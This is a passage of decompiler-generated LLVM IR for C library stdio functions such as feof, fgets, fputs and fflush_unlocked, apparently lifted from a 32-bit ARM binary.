  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a0dc.661 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a0ec.659 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1a108.653 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1a0c8.651 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_110e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_110e4, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_110b0, { 1, 0 }
  uselistorder label %dec_label_pc_11080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1106c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11028, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_10fe0, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e94, { 1, 0 }
  uselistorder label %dec_label_pc_10e6c, { 1, 0 }
  uselistorder label %dec_label_pc_10e1c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10d9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d98, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10ce8, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11114 = load i32, i32* @r4, align 4
  store i32 %v3_11114, i32* %stack_var_-16, align 4
  %v2_11118 = add i32 %tmp, 52
  %v3_11118 = inttoptr i32 %v2_11118 to i32*
  %v4_11118 = load i32, i32* %v3_11118, align 4
  store i32 %v4_11118, i32* %r6.global-to-local, align 4
  %v2_11120 = ptrtoint i32* %stack_var_-32 to i32
  %v2_11124 = icmp eq i32 %v4_11118, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_11120, i32* @r0, align 4
  br i1 %v2_11124, label %dec_label_pc_1113c, label %dec_label_pc_11158

dec_label_pc_1113c:                               ; preds = %entry
  %v1_11144 = call i32 @__pthread_return_void()
  %v1_11154 = call i32 @__pthread_return_0()
  %v0_11158.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_11160.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11158

dec_label_pc_11158:                               ; preds = %entry, %dec_label_pc_1113c
  %v0_11160 = phi i32 [ %v4_11118, %entry ], [ %v0_11160.pre, %dec_label_pc_1113c ]
  %v0_11158 = phi i32 [ %tmp, %entry ], [ %v0_11158.pre, %dec_label_pc_1113c ]
  %v1_11158 = add i32 %v0_11158, 1
  %v2_11158 = inttoptr i32 %v1_11158 to i8*
  %v3_11158 = load i8, i8* %v2_11158, align 1
  %v4_11158 = zext i8 %v3_11158 to i32
  %v1_1115c = inttoptr i32 %v0_11158 to i8*
  %v2_1115c = load i8, i8* %v1_1115c, align 1
  %v3_1115c = zext i8 %v2_1115c to i32
  %v2_11160 = icmp eq i32 %v0_11160, 0
  %v4_1116c = mul nuw nsw i32 %v4_11158, 256
  %v5_1116c = or i32 %v3_1115c, %v4_1116c
  store i32 %v5_1116c, i32* %r4.global-to-local, align 4
  br i1 %v2_11160, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11158
  call void @__pseudo_branch(i32 79836)
  %v0_1117c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11158, %bb
  %v0_1117c = phi i32 [ %v5_1116c, %dec_label_pc_11158 ], [ %v0_1117c.pre, %bb ]
  %v1_1117c = and i32 %v0_1117c, 4
  %v2_11184 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11184, i32* @r4, align 4
  ret i32 %v1_1117c

; uselistorder directives
  uselistorder i32 %v0_11158, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11158, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11198 = load i32, i32* @r4, align 4
  store i32 %v3_11198, i32* %stack_var_-24, align 4
  %v6_11198 = load i32, i32* @r5, align 4
  %v9_11198 = load i32, i32* @r6, align 4
  %v12_11198 = load i32, i32* @r7, align 4
  %v1_1119c = add i32 %arg3, 52
  %v2_1119c = inttoptr i32 %v1_1119c to i32*
  %v3_1119c = load i32, i32* %v2_1119c, align 4
  store i32 %v3_1119c, i32* %r8.global-to-local, align 4
  %v2_111a0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_111a4 = add i32 %arg3, 56
  store i32 %v1_111a4, i32* @r5, align 4
  %v2_111a8 = icmp eq i32 %v3_1119c, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_111a0, i32* @r0, align 4
  br i1 %v2_111a8, label %dec_label_pc_111c8, label %dec_label_pc_111e4

dec_label_pc_111c8:                               ; preds = %entry
  %v1_111d0 = call i32 @__pthread_return_void()
  store i32 70116, i32* @lr, align 4
  %v1_111e0 = call i32 @__pthread_return_0()
  %v0_111e4.pre = load i32, i32* @r6, align 4
  %v0_111e8.pre = load i32, i32* @r4, align 4
  %v0_111ec.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %entry, %dec_label_pc_111c8
  %v0_111ec = phi i32 [ %arg1, %entry ], [ %v0_111ec.pre, %dec_label_pc_111c8 ]
  %v0_111e8 = phi i32 [ %arg3, %entry ], [ %v0_111e8.pre, %dec_label_pc_111c8 ]
  %v0_111e4 = phi i32 [ %arg2, %entry ], [ %v0_111e4.pre, %dec_label_pc_111c8 ]
  %v3_111f0 = inttoptr i32 %v0_111ec to i8*
  %v4_111f0 = call i32 @__GI_fgets_unlocked(i8* %v3_111f0, i32 %v0_111e4, i32 %v0_111e8)
  %v0_111f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_111f4 = icmp eq i32 %v0_111f4, 0
  store i32 %v4_111f0, i32* %r4.global-to-local, align 4
  br i1 %v2_111f4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_111e4
  store i32 70160, i32* @lr, align 4
  call void @__pseudo_branch(i32 79836)
  %v0_11210.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_111e4, %bb
  %v0_11210 = phi i32 [ %v4_111f0, %dec_label_pc_111e4 ], [ %v0_11210.pre, %bb ]
  %v2_11218 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11218, i32* @r4, align 4
  store i32 %v6_11198, i32* @r5, align 4
  store i32 %v9_11198, i32* @r6, align 4
  store i32 %v12_11198, i32* @r7, align 4
  ret i32 %v0_11210

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_111e4, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1122c = load i32, i32* @r4, align 4
  store i32 %v3_1122c, i32* %stack_var_-20, align 4
  %v6_1122c = load i32, i32* @r5, align 4
  %v9_1122c = load i32, i32* @r6, align 4
  %v12_1122c = load i32, i32* @r7, align 4
  %v1_11230 = add i32 %arg2, 52
  %v2_11230 = inttoptr i32 %v1_11230 to i32*
  %v3_11230 = load i32, i32* %v2_11230, align 4
  store i32 %v3_11230, i32* @r7, align 4
  %v1_11234 = add i32 %arg2, 56
  store i32 %v1_11234, i32* @r5, align 4
  %v2_11238 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1123c = icmp eq i32 %v3_11230, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_11238, i32* @r0, align 4
  br i1 %v2_1123c, label %dec_label_pc_11258, label %dec_label_pc_11274

dec_label_pc_11258:                               ; preds = %entry
  %v1_11260 = call i32 @__pthread_return_void()
  store i32 70260, i32* @lr, align 4
  %v1_11270 = call i32 @__pthread_return_0()
  %v0_11274.pre = load i32, i32* @r4, align 4
  %v0_11278.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11274

dec_label_pc_11274:                               ; preds = %entry, %dec_label_pc_11258
  %v0_11278 = phi i32 [ %arg1, %entry ], [ %v0_11278.pre, %dec_label_pc_11258 ]
  %v0_11274 = phi i32 [ %arg2, %entry ], [ %v0_11274.pre, %dec_label_pc_11258 ]
  %v2_1127c = inttoptr i32 %v0_11278 to i8*
  %v3_1127c = call i32 @__GI_fputs_unlocked(i8* %v2_1127c, i32 %v0_11274)
  %v0_11280 = load i32, i32* @r7, align 4
  %v2_11280 = icmp eq i32 %v0_11280, 0
  store i32 %v3_1127c, i32* %r4.global-to-local, align 4
  br i1 %v2_11280, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11274
  call void @__pseudo_branch(i32 79836)
  %v0_1129c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11274, %bb
  %v0_1129c = phi i32 [ %v3_1127c, %dec_label_pc_11274 ], [ %v0_1129c.pre, %bb ]
  %v2_112a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_112a4, i32* @r4, align 4
  store i32 %v6_1122c, i32* @r5, align 4
  store i32 %v9_1122c, i32* @r6, align 4
  store i32 %v12_1122c, i32* @r7, align 4
  ret i32 %v0_1129c

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11274, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_112bc = ptrtoint i32* %stack_var_-48 to i32
  %v2_112c0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_112c0, i32* @r0, align 4
  store i32 79836, i32* %r4.global-to-local, align 4
  %v1_112d4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r5.global-to-local, align 4
  %v1_112e4 = call i32 @__pthread_return_0()
  %v2_112ec = load i32, i32* @global_var_27b4c.597, align 4
  %v7_112f0 = icmp eq i32 %v2_112ec, 1
  br i1 %v7_112f0, label %dec_label_pc_112f8, label %dec_label_pc_113a4

dec_label_pc_112f8:                               ; preds = %entry
  %v2_112fc = load i32, i32* @global_var_27b50.602, align 4
  %tmp19 = icmp slt i32 %v2_112fc, 1
  br i1 %tmp19, label %dec_label_pc_113a4, label %dec_label_pc_11308

dec_label_pc_11308:                               ; preds = %dec_label_pc_112f8
  store i32 %v2_112bc, i32* @r0, align 4
  %v1_11318 = call i32 @__pthread_return_void()
  %v1_11324 = call i32 @__pthread_return_0()
  %v2_1132c = load i32, i32* bitcast (i32** @global_var_237cc.617 to i32*), align 4
  store i32 %v2_1132c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1137c3 = icmp eq i32 %v2_1132c, 0
  br i1 %v2_1137c3, label %dec_label_pc_11388, label %dec_label_pc_11338

dec_label_pc_11338:                               ; preds = %dec_label_pc_11308, %dec_label_pc_11378
  %v1_11350 = phi i32 [ %v0_11378, %dec_label_pc_11378 ], [ %v2_1132c, %dec_label_pc_11308 ]
  %v1_11338 = inttoptr i32 %v1_11350 to i8*
  %v2_11338 = load i8, i8* %v1_11338, align 1
  %v3_11338 = zext i8 %v2_11338 to i32
  %v1_1133c = add i32 %v1_11350, 1
  %v2_1133c = inttoptr i32 %v1_1133c to i8*
  %v3_1133c = load i8, i8* %v2_1133c, align 1
  %v4_1133c = zext i8 %v3_1133c to i32
  %v4_11340 = mul nuw nsw i32 %v4_1133c, 256
  %v5_11340 = or i32 %v4_11340, %v3_11338
  %v2_11344 = and i32 %v5_11340, 32816
  %v7_11348 = icmp eq i32 %v2_11344, 48
  %v1_1134c = add i32 %v1_11350, 32
  %v2_1134c = inttoptr i32 %v1_1134c to i32*
  %v3_1134c = load i32, i32* %v2_1134c, align 4
  store i32 %v3_1134c, i32* %r5.global-to-local, align 4
  br i1 %v7_11348, label %dec_label_pc_11358, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_11338
  store i32 %v1_11350, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11378

dec_label_pc_11358:                               ; preds = %dec_label_pc_11338
  %v0_11358 = load i32, i32* %r6.global-to-local, align 4
  %v2_11358 = icmp eq i32 %v0_11358, 0
  br i1 %v2_11358, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_11358
  %v3_11360 = add i32 %v0_11358, 32
  %v4_11360 = inttoptr i32 %v3_11360 to i32*
  store i32 %v3_1134c, i32* %v4_11360, align 4
  %v0_11368.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_11358
  store i32 %v3_1134c, i32* bitcast (i32** @global_var_237cc.617 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_11368 = phi i32 [ %v0_11368.pre, %.thread ], [ %v1_11350, %.thread1 ]
  %v1_11368 = add i32 %v0_11368, 1
  %v2_11368 = inttoptr i32 %v1_11368 to i8*
  %v3_11368 = load i8, i8* %v2_11368, align 1
  %v1_1136c = and i8 %v3_11368, 32
  %v1_11374 = icmp ne i8 %v1_1136c, 0
  call void @__pseudo_cond_branch(i1 %v1_11374, i32 ptrtoint (i32* @global_var_12808.599 to i32))
  %v0_11378.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11378

dec_label_pc_11378:                               ; preds = %.thread12, %bb
  %v0_11378 = phi i32 [ %v0_11378.pre, %bb ], [ %v3_1134c, %.thread12 ]
  store i32 %v0_11378, i32* %r4.global-to-local, align 4
  %v2_1137c = icmp eq i32 %v0_11378, 0
  br i1 %v2_1137c, label %dec_label_pc_11388, label %dec_label_pc_11338

dec_label_pc_11388:                               ; preds = %dec_label_pc_11378, %dec_label_pc_11308
  store i32 %v2_112bc, i32* @r0, align 4
  %v1_11398 = call i32 @__pthread_return_void()
  %v0_113a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_113a0, i32* @global_var_27b50.602, align 4
  %v2_113a8.pre = load i32, i32* @global_var_27b4c.597, align 4
  br label %dec_label_pc_113a4

dec_label_pc_113a4:                               ; preds = %entry, %dec_label_pc_112f8, %dec_label_pc_11388
  %v2_113a8 = phi i32 [ %v2_112ec, %entry ], [ 1, %dec_label_pc_112f8 ], [ %v2_113a8.pre, %dec_label_pc_11388 ]
  %v1_113ac = add i32 %v2_113a8, -1
  store i32 %v1_113ac, i32* @global_var_27b4c.597, align 4
  store i32 %v2_112c0, i32* @r0, align 4
  store i32 70600, i32* @lr, align 4
  %v1_113c4 = call i32 @__pthread_return_void()
  ret i32 %v1_113c4

; uselistorder directives
  uselistorder i32 %v0_11378, { 2, 1, 0 }
  uselistorder i32 %v3_1134c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11350, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_27b50.602, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_113a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11378, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_11338, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_113f8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_237cc.617 to i32), i32* %r3.global-to-local, align 4
  %v10_11400 = icmp eq i8* %arg1, bitcast (i32** @global_var_237cc.617 to i8*)
  store i1 %v10_11400, i1* %cpsr_z.global-to-local, align 1
  %.v1_11404 = select i1 %v10_11400, i32 0, i32 %tmp
  store i32 %.v1_11404, i32* %r8.global-to-local, align 4
  %v2_1140c = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_11400, label %bb, label %dec_label_pc_11418

bb:                                               ; preds = %entry
  store i32 %.v1_11404, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11424

dec_label_pc_11418:                               ; preds = %entry
  %v2_11418 = icmp eq i32 %.v1_11404, 0
  store i1 %v2_11418, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_11418, label %dec_label_pc_11424, label %dec_label_pc_11570

dec_label_pc_11424:                               ; preds = %bb, %dec_label_pc_11418
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_1140c, i32* @r0, align 4
  %v1_11438 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_237e8.595 to i32), i32* %r0.global-to-local, align 4
  %v1_11448 = call i32 @__pthread_return_0()
  %v2_11450 = load i32, i32* @global_var_27b4c.597, align 4
  %v1_11454 = add i32 %v2_11450, 1
  store i32 %v1_11454, i32* %r3.global-to-local, align 4
  store i32 %v1_11454, i32* @global_var_27b4c.597, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_1140c, i32* @r0, align 4
  %v1_1146c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_1140c, i32* @r0, align 4
  %v1_11480 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_237d0.614 to i32), i32* %r0.global-to-local, align 4
  %v1_1148c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_237cc.617 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_1140c, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1149c = load i32, i32* bitcast (i32** @global_var_237cc.617 to i32*), align 4
  store i32 %v2_1149c, i32* @r6, align 4
  %v1_114a4 = call i32 @__pthread_return_void()
  store i32 %v1_114a4, i32* %r0.global-to-local, align 4
  store i32 %v2_1140c, i32* @r4, align 4
  %v0_114ac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_114ac, i32* @r5, align 4
  %v0_11560.pr = load i32, i32* @r6, align 4
  %v2_1156025 = icmp eq i32 %v0_11560.pr, 0
  store i1 %v2_1156025, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1156025, label %dec_label_pc_11568, label %dec_label_pc_114b4

dec_label_pc_114b4:                               ; preds = %dec_label_pc_11424, %.thread11
  %v0_114d0 = phi i32 [ %v3_1155c, %.thread11 ], [ %v0_11560.pr, %dec_label_pc_11424 ]
  %v1_114b4 = inttoptr i32 %v0_114d0 to i8*
  %v2_114b4 = load i8, i8* %v1_114b4, align 1
  %v3_114b4 = zext i8 %v2_114b4 to i32
  store i32 %v3_114b4, i32* %r3.global-to-local, align 4
  %v1_114b8 = and i32 %v3_114b4, 64
  %v2_114b8 = icmp eq i32 %v1_114b8, 0
  store i1 %v2_114b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114b8, label %.thread11, label %dec_label_pc_114c0

dec_label_pc_114c0:                               ; preds = %dec_label_pc_114b4
  %v2_114c4 = load i32, i32* @global_var_23800.608, align 4
  store i32 %v2_114c4, i32* %r3.global-to-local, align 4
  %v7_114c8 = icmp eq i32 %v2_114c4, 2
  store i1 %v7_114c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114c8, label %dec_label_pc_114fc, label %dec_label_pc_114d0

dec_label_pc_114d0:                               ; preds = %dec_label_pc_114c0
  %v1_114d0 = add i32 %v0_114d0, 56
  store i32 %v1_114d0, i32* @r4, align 4
  store i32 %v2_1140c, i32* @r0, align 4
  store i32 79836, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r1.global-to-local, align 4
  %v1_114e8 = call i32 @__pthread_return_void()
  %v0_114ec = load i32, i32* @r4, align 4
  store i32 %v0_114ec, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r3.global-to-local, align 4
  %v1_114f8 = call i32 @__pthread_return_0()
  store i32 %v1_114f8, i32* %r0.global-to-local, align 4
  %v0_114fc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_114fc

dec_label_pc_114fc:                               ; preds = %dec_label_pc_114c0, %dec_label_pc_114d0
  %v0_11510 = phi i32 [ %v0_114d0, %dec_label_pc_114c0 ], [ %v0_114fc.pre, %dec_label_pc_114d0 ]
  %v1_114fc = inttoptr i32 %v0_11510 to i32*
  %v2_114fc = load i32, i32* %v1_114fc, align 4
  %v0_11500 = load i32, i32* %sl.global-to-local, align 4
  %v2_11500 = or i32 %v0_11500, %v2_114fc
  %v1_11504 = xor i32 %v2_11500, 320
  store i32 %v1_11504, i32* %r3.global-to-local, align 4
  %v1_11508 = and i32 %v1_11504, 832
  %v2_11508 = icmp eq i32 %v1_11508, 0
  store i1 %v2_11508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11508, label %dec_label_pc_11510, label %bb39

dec_label_pc_11510:                               ; preds = %dec_label_pc_114fc
  store i32 %v0_11510, i32* @r0, align 4
  %v0_11514 = call i32 @__stdio_wcommit()
  store i32 %v0_11514, i32* %r0.global-to-local, align 4
  %v2_11518 = icmp eq i32 %v0_11514, 0
  store i1 %v2_11518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11518, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_11510
  %v1_1151c = load i32, i32* @r6, align 4
  %v2_1151c = inttoptr i32 %v1_1151c to i32*
  %v3_1151c = load i32, i32* %v2_1151c, align 4
  store i32 %v3_1151c, i32* %r3.global-to-local, align 4
  %v2_11520 = add i32 %v1_1151c, 8
  %v3_11520 = inttoptr i32 %v2_11520 to i32*
  %v4_11520 = load i32, i32* %v3_11520, align 4
  %v2_11524 = and i32 %v3_1151c, -65
  store i32 %v2_11524, i32* %r3.global-to-local, align 4
  %v4_11528 = sdiv i32 %v3_1151c, 256
  store i32 %v4_11528, i32* %r1.global-to-local, align 4
  %v3_1152c = add i32 %v1_1151c, 28
  %v4_1152c = inttoptr i32 %v3_1152c to i32*
  store i32 %v4_11520, i32* %v4_1152c, align 4
  %v1_11530 = load i32, i32* %r1.global-to-local, align 4
  %v2_11530 = trunc i32 %v1_11530 to i8
  %v3_11530 = load i32, i32* @r6, align 4
  %v4_11530 = add i32 %v3_11530, 1
  %v5_11530 = inttoptr i32 %v4_11530 to i8*
  store i8 %v2_11530, i8* %v5_11530, align 1
  %v0_11534.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11534.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_11534 = load i32, i32* %r3.global-to-local, align 4
  %v2_11534 = trunc i32 %v1_11534 to i8
  %v3_11534 = load i32, i32* @r6, align 4
  %v4_11534 = inttoptr i32 %v3_11534 to i8*
  store i8 %v2_11534, i8* %v4_11534, align 1
  %v0_11538.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11538.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11510, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_114fc, %.thread6, %.thread7
  %v2_11540 = load i32, i32* @global_var_23800.608, align 4
  store i32 %v2_11540, i32* %r3.global-to-local, align 4
  %v7_11544 = icmp eq i32 %v2_11540, 2
  store i1 %v7_11544, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11544, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_1140c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 79836, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 79836)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_114b4, %bb40
  %v0_1155c = load i32, i32* @r6, align 4
  %v1_1155c = add i32 %v0_1155c, 32
  %v2_1155c = inttoptr i32 %v1_1155c to i32*
  %v3_1155c = load i32, i32* %v2_1155c, align 4
  store i32 %v3_1155c, i32* @r6, align 4
  %v2_11560 = icmp eq i32 %v3_1155c, 0
  store i1 %v2_11560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11560, label %dec_label_pc_11560.dec_label_pc_11568_crit_edge, label %dec_label_pc_114b4

dec_label_pc_11560.dec_label_pc_11568_crit_edge:  ; preds = %.thread11
  %v0_11568.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11568

dec_label_pc_11568:                               ; preds = %dec_label_pc_11560.dec_label_pc_11568_crit_edge, %dec_label_pc_11424
  %v0_11568 = phi i32 [ %v0_11568.pre, %dec_label_pc_11560.dec_label_pc_11568_crit_edge ], [ %v1_114a4, %dec_label_pc_11424 ]
  %v1_11568 = call i32 @_stdio_openlist_dec_use(i32 %v0_11568)
  store i32 %v1_11568, i32* %r0.global-to-local, align 4
  %v0_115ac.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_11570:                               ; preds = %dec_label_pc_11418
  %v1_11570 = inttoptr i32 %.v1_11404 to i8*
  %v2_11570 = load i8, i8* %v1_11570, align 1
  %v3_11570 = zext i8 %v2_11570 to i32
  %v1_11574 = and i32 %v3_11570, 64
  store i32 %v1_11574, i32* %r3.global-to-local, align 4
  %v2_11574 = icmp eq i32 %v1_11574, 0
  store i1 %v2_11574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11574, label %bb41, label %dec_label_pc_11580

bb41:                                             ; preds = %dec_label_pc_11570
  br label %bb43

dec_label_pc_11580:                               ; preds = %dec_label_pc_11570
  %v0_11580 = call i32 @__stdio_wcommit()
  store i32 %v0_11580, i32* %r0.global-to-local, align 4
  %v2_11584 = icmp eq i32 %v0_11580, 0
  store i1 %v2_11584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11584, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_11580
  %v1_11588 = load i32, i32* %r8.global-to-local, align 4
  %v2_11588 = inttoptr i32 %v1_11588 to i32*
  %v3_11588 = load i32, i32* %v2_11588, align 4
  store i32 %v3_11588, i32* %r3.global-to-local, align 4
  %v2_1158c = add i32 %v1_11588, 8
  %v3_1158c = inttoptr i32 %v2_1158c to i32*
  %v4_1158c = load i32, i32* %v3_1158c, align 4
  store i32 %v4_1158c, i32* %r1.global-to-local, align 4
  %v2_11590 = and i32 %v3_11588, -65
  store i32 %v2_11590, i32* %r3.global-to-local, align 4
  %v4_11594 = sdiv i32 %v3_11588, 256
  %v2_11598 = trunc i32 %v4_11594 to i8
  %v4_11598 = add i32 %v1_11588, 1
  %v5_11598 = inttoptr i32 %v4_11598 to i8*
  store i8 %v2_11598, i8* %v5_11598, align 1
  %v0_1159c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1159c.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_1159c = load i32, i32* %r1.global-to-local, align 4
  %v2_1159c = load i32, i32* %r8.global-to-local, align 4
  %v3_1159c = add i32 %v2_1159c, 28
  %v4_1159c = inttoptr i32 %v3_1159c to i32*
  store i32 %v1_1159c, i32* %v4_1159c, align 4
  %v1_115a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_115a0 = trunc i32 %v1_115a0 to i8
  %v3_115a0 = load i32, i32* %r8.global-to-local, align 4
  %v4_115a0 = inttoptr i32 %v3_115a0 to i8*
  store i8 %v2_115a0, i8* %v4_115a0, align 1
  %v0_115a4.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
